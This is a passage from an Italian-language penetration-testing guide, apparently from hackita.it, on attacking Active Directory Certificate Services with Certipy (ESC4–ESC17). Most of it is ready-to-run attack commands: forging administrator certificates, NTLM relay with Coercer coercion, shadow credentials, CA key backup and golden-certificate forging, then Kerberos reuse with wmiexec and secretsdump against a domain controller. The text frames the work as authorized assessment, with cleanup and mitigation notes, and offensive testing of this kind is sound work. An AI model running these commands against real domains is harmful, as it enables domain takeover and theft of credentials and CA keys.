  -ca 'CORP-CA' \
  -template 'LegacyVPN' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -out 'administrator-esc4.pfx'
```

### 4. Ripristina immediatamente il template

```bash
certipy template \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -template 'LegacyVPN' \
  -write-configuration 'LegacyVPN-original.json'
```

### 5. Verifica il ripristino

```bash
certipy find \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -stdout \
  | sed -n '/Template Name.*LegacyVPN/,/^$/p'
```

### Impatto e footprint ESC4

La modifica del template è altamente visibile quando l'auditing è configurato. Può generare eventi relativi a template aggiornati e modifica della security descriptor. Il ripristino non elimina la traccia: produce un'ulteriore modifica. In un pentest concorda sempre prima se la modifica di oggetti PKI è ammessa e pianifica rollback, timestamp e hash del backup JSON.

***

## ESC5: controllo sulla PKI, sul server CA o sulla chiave privata

ESC5 è una categoria ampia: include controllo su oggetti PKI in Active Directory, privilegi locali sul server CA, accesso a backup, chiave privata della CA, service account e configurazioni correlate.

### Cosa enumera Certipy

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Controlla ACL su:

```text
Enrollment Services
Certificate Templates
NTAuthCertificates
AIA e CDP
OID / issuance policy
CA computer account
PKI container in Configuration partition
```

### Backup della CA

```bash
certipy ca \
  -u 'administrator@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -backup
```

`ca -backup` non equivale al solo possesso di `Manage CA`: l'operazione interagisce con il server CA, servizi remoti e condivisioni amministrative e richiede privilegi effettivi sufficienti sul sistema. Trattala come attività post-exploitation Tier 0, non come normale enumerazione.

### Verifica del PFX della CA

```bash
certipy cert \
  -pfx 'CORP-CA.pfx' \
  -nocert \
  -out 'CORP-CA-private-key.pem'
```

```bash
certipy cert \
  -pfx 'CORP-CA.pfx' \
  -nokey \
  -out 'CORP-CA-certificate.pem'
```

Se il PFX è protetto:

```bash
certipy cert \
  -pfx 'CORP-CA.pfx' \
  -password 'CaPfxPassphrase!' \
  -nokey \
  -out 'CORP-CA-certificate.pem'
```

La compromissione della chiave della CA richiede una risposta d'incidente PKI completa. Cambiare password a un utente o revocare un singolo certificato non risolve la possibilità di forgiare nuovi certificati.

***

## ESC6: SAN arbitrario configurato sulla CA

ESC6 si verifica quando la CA accetta attributi SAN forniti nella richiesta, tipicamente per effetto di configurazioni come `EDITF_ATTRIBUTESUBJECTALTNAME2`. Il problema è a livello CA e può influenzare più template.

### Enumerazione

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Cerca un'indicazione simile a:

```text
User Specified SAN: Enabled
Vulnerabilities: ESC6
```

### Richiesta con UPN e SID

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -out 'administrator-esc6.pfx'
```

Nei domini aggiornati, ESC6 da solo può non bastare perché la SID security extension del template lega il certificato all'account richiedente. La catena reale può richiedere ESC9, ESC16 o un'altra debolezza di mapping. Riporta quindi la configurazione e l'exploitability separatamente:

```text
Configurazione CA debole: presente
Catena sfruttabile dall'identità testata: da dimostrare
Certificate mapping mode: verificato / non verificato
```

***

## ESC7: Manage CA e Manage Certificates

ESC7 riguarda ACL troppo permissive sulla CA. I due privilegi più importanti sono:

```text
Manage CA
Manage Certificates
```

`Manage CA` permette di modificare configurazioni e ruoli della CA; `Manage Certificates` consente di approvare, negare o gestire richieste. Una catena comune usa il template `SubCA`.

### 1. Elenca i template pubblicati

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -list-templates
```

### 2. Aggiungi l'account come Certificate Officer

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -add-officer 'attacker'
```

### 3. Pubblica il template SubCA se necessario

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA'
```

### 4. Invia la richiesta

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'SubCA' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500'
```

Se la richiesta viene negata ma ricevi un Request ID, salva la private key quando Certipy lo propone:

```text
Request ID is 42
Would you like to save the private key? (y/N): y
Saving private key to 42.key
```

### 5. Approva la richiesta

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -issue-request 42
```

### 6. Recupera il certificato

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -retrieve 42
```

Certipy cerca normalmente il file `42.key` nella directory corrente e lo combina con il certificato emesso.

### 7. Cleanup autorizzato

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -disable-template 'SubCA'
```

```bash
certipy ca \
  -u 'attacker@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -remove-officer 'attacker'
```

Disabilita il template soltanto se sei certo che prima non fosse pubblicato. In un assessment serio salva lo stato iniziale e ripristina esattamente quello, non una configurazione “presunta”.

***

## ESC8: NTLM relay verso AD CS Web Enrollment

ESC8 non è “il web enrollment è attivo”. La catena richiede contemporaneamente:

```text
Endpoint HTTP AD CS raggiungibile
+ autenticazione NTLM accettata
+ protezioni IIS insufficienti, in particolare EPA/channel binding
+ identità target coercibile o autenticazione NTLM intercettabile
+ template utile per l'account relayed
```

### Verifica degli endpoint

```bash
curl -k -I 'https://CA01.corp.local/certsrv/'
```

```bash
curl -I 'http://CA01.corp.local/certsrv/'
```

Controlla `WWW-Authenticate`, redirect, TLS, autenticazione Windows e configurazione Extended Protection. Una risposta `401` con NTLM non dimostra da sola la relayability.

### Avvia il relay Certipy

Per un Domain Controller:

```bash
sudo certipy relay \
  -target 'http://CA01.corp.local' \
  -template 'DomainController' \
  -interface '0.0.0.0' \
  -port 445
```

Per mantenere il listener attivo su più autenticazioni autorizzate:

```bash
sudo certipy relay \
  -target 'http://CA01.corp.local' \
  -template 'DomainController' \
  -interface '0.0.0.0' \
  -port 445 \
  -forever
```

Per enumerare i template visibili tramite il portale durante il relay:

```bash
sudo certipy relay \
  -target 'http://CA01.corp.local' \
  -enum-templates
```

### Coercion in laboratorio autorizzato

Con Coercer:

```bash
python3 Coercer.py scan \
  -t '10.0.0.10' \
  -u 'utente' -p 'Password123!' \
  -d 'corp.local' \
  -v
```

```bash
python3 Coercer.py coerce \
  -t '10.0.0.10' \
  -l '10.0.0.50' \
  -u 'utente' -p 'Password123!' \
  -d 'corp.local'
```

`10.0.0.50` è l'IP del sistema su cui ascolta Certipy. La coercion è rumorosa, può influire sui servizi e deve essere esplicitamente autorizzata nelle regole d'ingaggio.

### Autenticazione con il certificato macchina

```bash
certipy auth \
  -pfx 'dc01.pfx' \
  -dc-ip '10.0.0.10'
```

Un certificato per il computer account del DC può consentire autenticazione come `DC01$`. L'eventuale escalation successiva dipende dai privilegi dell'account macchina e dagli obiettivi autorizzati. Per la catena completa di coercion e relay consulta [NTLM Relay](https://hackita.it/articoli/ntlm-relay/).

### Perché il vecchio comando era incompleto

Questa forma, presente in guide più vecchie, è **incompleta e non va eseguita**:

```text
ERRATO: certipy relay -ca CA01.corp.local -template DomainController
```

`relay` richiede obbligatoriamente:

```text
-target protocol://host
```

Per ESC8 usa `http://` o l'endpoint HTTP previsto; `-ca` è invece necessario nel relay RPC ESC11.

***

## ESC9: template senza SID security extension

ESC9 riguarda template configurati con `CT_FLAG_NO_SECURITY_EXTENSION`. Il certificato viene emesso senza la SID security extension che normalmente consente al KDC di associarlo fortemente all'oggetto richiedente.

Nel 2026 ESC9 non va presentato come bypass universale: l'impatto dipende dal certificate mapping, dalla modalità dei Domain Controller e spesso da una catena con ESC6 o da controllo su attributi dell'account.

### Enumerazione

```bash
certipy find \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Cerca:

```text
No Security Extension: True
Vulnerabilities: ESC9
Remarks: condizioni di mapping richieste
```

### Leggere l'account target con Certipy

```bash
certipy account \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'targetuser' \
  read
```

Il comando espone UPN, sAMAccountName, SID, DNS hostname e SPN, in base al tipo di oggetto e ai permessi di lettura.

### Modifica UPN solo quando autorizzata dall'ACL

```bash
certipy account \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'targetuser' \
  -upn 'administrator@corp.local' \
  update
```

Questa operazione funziona soltanto se l'identità corrente possiede realmente il diritto di scrivere l'attributo. Salva il valore originale e ripristinalo dopo il test:

```bash
certipy account \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'targetuser' \
  -upn 'targetuser@corp.local' \
  update
```

### Richiedere dal template ESC9

```bash
certipy req \
  -u 'targetuser@corp.local' -p 'TargetUserPassword!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'NoSecurityExtension' \
  -out 'esc9-targetuser.pfx'
```

La catena va adattata alle reali ACL e alla modalità di mapping. Se i DC sono in Full Enforcement e non esiste una condizione aggiuntiva valida, la semplice assenza dell'estensione può non produrre impersonation.

***

## ESC10: weak certificate mapping tramite Schannel

ESC10 riguarda configurazioni deboli del certificate mapping, soprattutto lato Schannel. A differenza di molte configurazioni AD CS, alcune chiavi determinanti risiedono nel registro dei server che accettano il certificato e non sono completamente enumerabili da LDAP remoto.

### Perché `find` non basta

Certipy può mostrare indizi e condizioni correlate, ma il risultato deve essere integrato con una verifica amministrativa delle impostazioni Schannel e del mapping esplicito/implicito.

### Autenticazione LDAP con Schannel

Quando possiedi un certificato valido e vuoi verificare il mapping LDAP:

```bash
certipy auth \
  -pfx 'identity.pfx' \
  -dc-ip '10.0.0.10' \
  -ldap-shell
```

Per forzare LDAPS:

```bash
certipy auth \
  -pfx 'identity.pfx' \
  -dc-ip '10.0.0.10' \
  -ldap-shell \
  -ldap-scheme 'ldaps' \
  -ldap-port 636
```

La shell LDAP consente di dimostrare quale identità viene effettivamente mappata. Non attribuire ESC10 soltanto perché PKINIT fallisce e Schannel funziona: documenta le impostazioni di mapping, il certificato, il servizio e l'identità risultante.

***

## ESC11: NTLM relay verso RPC enrollment

ESC11 sfrutta l'enrollment RPC quando la CA non richiede packet privacy per le richieste ICertPassage. La mitigazione chiave è il flag:

```text
IF_ENFORCEENCRYPTICERTREQUEST
```

### Avvia il relay RPC

```bash
sudo certipy relay \
  -target 'rpc://CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'DomainController' \
  -interface '0.0.0.0' \
  -port 445
```

Per più autenticazioni:

```bash
sudo certipy relay \
  -target 'rpc://CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'DomainController' \
  -interface '0.0.0.0' \
  -port 445 \
  -forever
```

La differenza sintattica essenziale è:

```text
ESC8  → -target http://CA01.corp.local
ESC11 → -target rpc://CA01.corp.local -ca CORP-CA
```

### Mitigazione lato CA

Da una console amministrativa autorizzata sul server CA:

```cmd
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc
net start certsvc
```

Prima di modificare la CA, valuta compatibilità e change management. Il flag sicuro è normalmente previsto; la vulnerabilità nasce quando viene disabilitato o non applicato.

***

## ESC12: accesso a YubiHSM2 o materiale HSM della CA

ESC12 è specifico di implementazioni in cui la private key della CA è protetta da YubiHSM2 ma credenziali, auth key o configurazioni dell'HSM risultano compromettibili.

Certipy non trasforma automaticamente una qualsiasi sessione sul server CA in ESC12. Devi dimostrare:

```text
tipo di HSM e integrazione
accesso alle credenziali/auth key HSM
possibilità di usare la chiave CA per firmare
limiti di export o non-exportability
ruoli amministrativi e audit HSM
```

Una volta ottenuto legittimamente il materiale di firma o una CA PFX esportabile, la fase Certipy torna simile a ESC5/Golden Certificate:

```bash
certipy forge \
  -ca-pfx 'CORP-CA.pfx' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -out 'administrator-forged.pfx'
```

Non presentare questa tecnica come applicabile a ogni HSM: molti modelli impediscono l'export della chiave e richiedono un abuso specifico dell'interfaccia di firma.

***

## ESC13: issuance policy OID collegata a gruppi AD

ESC13 sfrutta certificate template che includono una issuance policy OID collegata a un gruppo AD tramite `msDS-OIDToGroupLink`. Durante l'autenticazione, il certificato può conferire membership o autorizzazioni associate al gruppo collegato.

### Enumera OID e gruppi collegati

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -oids -stdout
```

Output strutturato:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -oids -json -output 'corp-oids'
```

Cerca:

```text
OID / msPKI-Cert-Template-OID
msDS-OIDToGroupLink
gruppo collegato
privilegi del gruppo
certificate template che include la policy
identità con diritto di enrollment
```

### Richiedi il certificato

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'PolicyTemplate' \
  -out 'policy-user.pfx'
```

### Autentica e verifica il token risultante

```bash
certipy auth \
  -pfx 'policy-user.pfx' \
  -dc-ip '10.0.0.10'
```

Il finding è realmente critico soltanto se il gruppo collegato conferisce privilegi ad alto impatto. Una issuance policy collegata a un gruppo privo di diritti sensibili può avere impatto basso o nullo.

***

## ESC14: explicit certificate mapping debole

ESC14 ruota attorno a mapping espliciti tramite l'attributo:

```text
altSecurityIdentities
```

La catena richiede in genere la possibilità di scrivere un mapping su un account e un certificato controllato che soddisfi il formato di mapping accettato.

### Leggi l'account

```bash
certipy account \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'targetuser' \
  read
```

Certipy non è un sostituto completo di un'analisi ACL con BloodHound o LDAP per `altSecurityIdentities`. Usa `find` e `account` per il contesto, poi verifica:

```text
chi può scrivere altSecurityIdentities
formato del mapping configurato
issuer e subject del certificato
strong vs weak explicit mapping
servizio che accetta l'autenticazione
```

Per evitare falsi positivi, non classificare come ESC14 una semplice ACL di scrittura generica senza dimostrare un mapping certificate-based utilizzabile.

***

## ESC15: Arbitrary Application Policies su template V1

ESC15, nota anche come **EKUwu**, è associata a CVE-2024-49019. Colpisce scenari con template schema version 1 e CA non aggiornata, permettendo di inserire application policy arbitrarie nella richiesta.

### Condizioni da verificare

```text
CA non corretta per CVE-2024-49019
+ template V1 utilizzabile dall'attaccante
+ possibilità di fornire application policy nella richiesta
+ policy scelta con impatto concreto
```

### Enumerazione

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Certipy può identificare la condizione del template, ma la patch della CA deve essere verificata amministrativamente. Non dedurre che il server sia vulnerabile soltanto dal numero di versione del template.

### Richiesta con Client Authentication

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'WebServerV1' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -application-policies 'Client Authentication' \
  -out 'administrator-esc15.pfx'
```

Puoi usare anche l'OID esplicito:

```bash
-application-policies '1.3.6.1.5.5.7.3.2'
```

Dopo le patch Microsoft di novembre 2024, la richiesta arbitraria deve essere rifiutata o neutralizzata. Nel report includi stato patch, template schema version, request ID, policy richiesta e contenuto del certificato emesso.

***

## ESC16: SID security extension disabilitata sulla CA

ESC16 è simile a ESC9 nell'effetto, ma la causa è globale: la CA è configurata per omettere la SID security extension dai certificati emessi.

### Enumerazione

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Cerca nella sezione CA:

```text
Disabled Extensions
1.3.6.1.4.1.311.25.2
Vulnerabilities: ESC16
```

La presenza di ESC16 aumenta la superficie di attacco su più template, ma Full Enforcement e gli altri metodi di mapping restano determinanti. Valuta la catena completa con UPN, SID, ACL di account e configurazioni ESC6/ESC10.

### Richiesta di verifica

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -out 'esc16-test.pfx'
```

Esamina il certificato:

```bash
openssl pkcs12 \
  -in 'esc16-test.pfx' \
  -clcerts -nokeys \
  -passin pass: \
  | openssl x509 -text -noout
```

L'assenza della SID extension su un certificato emesso è evidenza tecnica della configurazione, non prova sufficiente dell'impersonation di un account privilegiato.

***

## ESC17: certificati Server Authentication e impersonazione di servizi

ESC17, aggiunta alla copertura Certipy nel 2026, riguarda template che consentono al richiedente di specificare il subject e rilasciano certificati con **Server Authentication**. Il certificato può essere usato per impersonare un servizio TLS se il client si fida della CA e il nome DNS corrisponde.

### Condizioni principali

```text
Enrollee supplies subject/DNS
+ EKU Server Authentication
+ enrollment disponibile all'identità corrente
+ nome di un servizio target controllabile nella richiesta
+ client che si fida della CA enterprise
+ possibilità di posizionarsi nel flusso o controllare la risoluzione/endpoint
```

### Enumerazione

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

### Richiesta di un certificato server per il lab

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'WebServerUserSupplied' \
  -dns 'wsus01.corp.local' \
  -subject 'CN=wsus01.corp.local' \
  -out 'wsus01-server.pfx'
```

### Verifica del certificato

```bash
openssl pkcs12 \
  -in 'wsus01-server.pfx' \
  -clcerts -nokeys \
  -passin pass: \
  | openssl x509 -text -noout
```

Conferma:

```text
DNS:wsus01.corp.local nel SAN
Server Authentication nell'EKU/Application Policies
chain valida verso la CA enterprise
private key presente nel PFX
```

ESC17 non equivale automaticamente a compromissione di WSUS o di ogni servizio HTTPS. La seconda fase dipende dal protocollo, dalla risoluzione del nome, dalla posizione di rete, dalla validazione del client e dalle protezioni applicative.

***

## `auth`: PKINIT, Schannel, TGT e recupero hash

`certipy auth` analizza le identità nel certificato e tenta l'autenticazione. La modalità standard usa PKINIT per ottenere un TGT Kerberos; opzionalmente può tentare il recupero dell'NT hash. Con `-ldap-shell` usa il certificato per autenticazione LDAP Schannel.

### Autenticazione standard

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10'
```

### PFX protetto da password

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -password 'PfxPassphrase!' \
  -dc-ip '10.0.0.10'
```

### Identità esplicita

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10' \
  -username 'administrator' \
  -domain 'corp.local'
```

### Salva anche un ticket Kirbi

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10' \
  -kirbi
```

### Non tentare il recupero dell'NT hash

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10' \
  -no-hash
```

Questa opzione è utile quando ti basta il TGT o vuoi limitare le operazioni successive all'autenticazione.

### Mostra il ticket

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10' \
  -print
```

### LDAP shell via Schannel

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10' \
  -ldap-shell
```

Quando PKINIT non è supportato ma LDAPS accetta il certificato, Schannel può ancora essere un percorso valido. L'identità mappata può però differire dalle aspettative: verifica sempre chi sei nella sessione LDAP.

### Riutilizzare la ccache

```bash
export KRB5CCNAME="$PWD/administrator.ccache"
klist
```

```bash
impacket-wmiexec \
  -k -no-pass \
  'corp.local/administrator@WS01.corp.local'
```

```bash
impacket-secretsdump \
  -k -no-pass \
  'corp.local/administrator@DC01.corp.local'
```

L'uso di questi comandi deve essere limitato ai sistemi e agli obiettivi esplicitamente autorizzati.

***

## `shadow`: Shadow Credentials con msDS-KeyCredentialLink

Il sottocomando `shadow` automatizza l'abuso di `msDS-KeyCredentialLink`. Il requisito reale è il diritto di scrittura sull'attributo dell'account target; non basta essere un normale utente di dominio.

### Workflow automatico

```bash
certipy shadow auto \
  -u 'attacker@corp.local' -p 'Password123!' \
  -account 'targetuser' \
  -dc-ip '10.0.0.10'
```

`auto` aggiunge una Key Credential, autentica, tenta di recuperare le credenziali e ripristina lo stato. Verifica comunque l'output e le Key Credential residue.

### Elenca le Key Credential

```bash
certipy shadow list \
  -u 'attacker@corp.local' -p 'Password123!' \
  -account 'targetuser' \
  -dc-ip '10.0.0.10'
```

### Informazioni dettagliate

```bash
certipy shadow info \
  -u 'attacker@corp.local' -p 'Password123!' \
  -account 'targetuser' \
  -device-id '01234567-89ab-cdef-0123-456789abcdef' \
  -dc-ip '10.0.0.10'
```

### Aggiunta manuale

```bash
certipy shadow add \
  -u 'attacker@corp.local' -p 'Password123!' \
  -account 'targetuser' \
  -dc-ip '10.0.0.10' \
  -out 'targetuser-shadow.pfx'
```

### Rimozione mirata

```bash
certipy shadow remove \
  -u 'attacker@corp.local' -p 'Password123!' \
  -account 'targetuser' \
  -device-id '01234567-89ab-cdef-0123-456789abcdef' \
  -dc-ip '10.0.0.10'
```

### `clear`: attenzione

```bash
certipy shadow clear \
  -u 'attacker@corp.local' -p 'Password123!' \
  -account 'targetuser' \
  -dc-ip '10.0.0.10'
```

`clear` rimuove tutte le Key Credential dell'account e può interrompere Windows Hello for Business o altri meccanismi legittimi. Non usarlo come cleanup generico. Preferisci la rimozione per Device ID della sola entry creata durante il test.

Per il contesto completo consulta [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## `ca`: amministrare CA, template e richieste

`certipy ca` raggruppa operazioni ad alto impatto. La disponibilità di un flag non implica che l'utente possa eseguirlo: ogni azione richiede i corrispondenti privilegi sulla CA o sul server.

### Elenca i template pubblicati

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -list-templates
```

### Pubblica e rimuovi un template

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -enable-template 'VPNUser'
```

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -disable-template 'VPNUser'
```

### Approva o nega una richiesta

```bash
certipy ca \
  -u 'certificateofficer@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -issue-request 42
```

```bash
certipy ca \
  -u 'certificateofficer@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -deny-request 43
```

### Gestisci Certificate Officer

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -add-officer 'certificateofficer'
```

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -remove-officer 'certificateofficer'
```

### Gestisci CA Manager

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -add-manager 'newpkiadmin'
```

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -remove-manager 'newpkiadmin'
```

### Mostra configurazione e security descriptor

```bash
certipy ca \
  -u 'pkiadmin@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -config
```

In un report annota sempre chi dispone di:

```text
Enroll
Manage CA
Manage Certificates
controllo locale del server CA
backup operator / accesso alle condivisioni amministrative
accesso alla private key o all'HSM
```

***

## `cert`: conversione e gestione locale di PFX, certificati e chiavi

`certipy cert` opera localmente e non contatta il dominio. È utile per dividere un PFX, ricrearlo da PEM/DER o aggiungere una password di export.

### Esporta soltanto il certificato

```bash
certipy cert \
  -pfx 'utente.pfx' \
  -nokey \
  -out 'utente.crt'
```

### Esporta soltanto la private key

```bash
certipy cert \
  -pfx 'utente.pfx' \
  -nocert \
  -out 'utente.key'
```

### PFX protetto in input

```bash
certipy cert \
  -pfx 'utente-protetto.pfx' \
  -password 'PfxPassphrase!' \
  -nokey \
  -out 'utente.crt'
```

### Ricrea un PFX da chiave e certificato

```bash
certipy cert \
  -key 'utente.key' \
  -cert 'utente.crt' \
  -export \
  -out 'utente-ricreato.pfx' \
  -export-password 'NuovaPassphrase!'
```

### Ispezione alternativa con OpenSSL

```bash
openssl pkcs12 \
  -in 'utente.pfx' \
  -info -nodes
```

```bash
openssl pkcs12 \
  -in 'utente.pfx' \
  -clcerts -nokeys \
  | openssl x509 -text -noout
```

Evita `-nodes` su sistemi condivisi: stampa la private key in chiaro.

***

## `account`: leggere e modificare utenti o computer AD

`certipy account` è particolarmente utile nelle catene ESC9/ESC16, nella creazione di computer account autorizzati e nel troubleshooting delle identità.

### Leggi un utente

```bash
certipy account \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'administrator' \
  read
```

### Leggi un computer

```bash
certipy account \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'DC01$' \
  read
```

### Crea un computer account quando MachineAccountQuota e ACL lo consentono

```bash
certipy account \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'LABCLIENT$' \
  -dns 'labclient.corp.local' \
  -pass 'MachinePass123!' \
  create
```

### Aggiorna attributi

```bash
certipy account \
  -u 'delegatedadmin@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'LABCLIENT$' \
  -spns 'HOST/labclient.corp.local,RestrictedKrbHost/labclient.corp.local' \
  update
```

### Elimina soltanto oggetti creati per il test

```bash
certipy account \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -user 'LABCLIENT$' \
  delete
```

Non eliminare account preesistenti. Conserva distinguished name, SID, attributi e timestamp dello stato iniziale.

***

## `parse`: analisi offline di configurazioni AD CS

`parse` permette di analizzare output BOF o file `.reg` esportati da Windows senza una connessione LDAP diretta al dominio.

### Parse di un file `.reg`

```bash
certipy parse \
  'adcs-registry.reg' \
  -format 'reg' \
  -domain 'corp.local' \
  -ca 'CORP-CA' \
  -vulnerable -stdout
```

### Output JSON e CSV

```bash
certipy parse \
  'adcs-registry.reg' \
  -format 'reg' \
  -domain 'corp.local' \
  -ca 'CORP-CA' \
  -json -csv \
  -output 'offline-adcs'
```

### Specifica SID posseduti e template pubblicati

```bash
certipy parse \
  'adcs-registry.reg' \
  -format 'reg' \
  -domain 'corp.local' \
  -ca 'CORP-CA' \
  -sids 'S-1-5-21-111111111-222222222-333333333-1105,S-1-5-11' \
  -published 'User,Machine,VPNUser' \
  -enabled -vulnerable -stdout
```

L'analisi offline è utile in ambienti isolati, ma non sostituisce completamente l'enumerazione live: reachability, web enrollment, ACL annidate, endpoint RPC e stato corrente possono divergere dal dump.

***

## `forge`: Golden Certificate e certificati firmati offline

`certipy forge` richiede normalmente il certificato della CA e la relativa private key. Una volta compromessa la chiave, puoi creare certificati che risultano firmati dalla CA senza inviare una richiesta alla CA stessa.

### Golden Certificate per un utente

```bash
certipy forge \
  -ca-pfx 'CORP-CA.pfx' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local' \
  -out 'administrator-forged.pfx'
```

### CA PFX protetto

```bash
certipy forge \
  -ca-pfx 'CORP-CA.pfx' \
  -ca-password 'CaPfxPassphrase!' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -out 'administrator-forged.pfx'
```

### Certificato macchina

```bash
certipy forge \
  -ca-pfx 'CORP-CA.pfx' \
  -dns 'dc01.corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-1000' \
  -subject 'CN=DC01,OU=Domain Controllers,DC=corp,DC=local' \
  -out 'dc01-forged.pfx'
```

### Clona proprietà da un certificato legittimo

```bash
certipy forge \
  -ca-pfx 'CORP-CA.pfx' \
  -template 'legitimate-user.pfx' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -out 'administrator-cloned.pfx'
```

### Validità ridotta per il laboratorio

```bash
certipy forge \
  -ca-pfx 'CORP-CA.pfx' \
  -upn 'administrator@corp.local' \
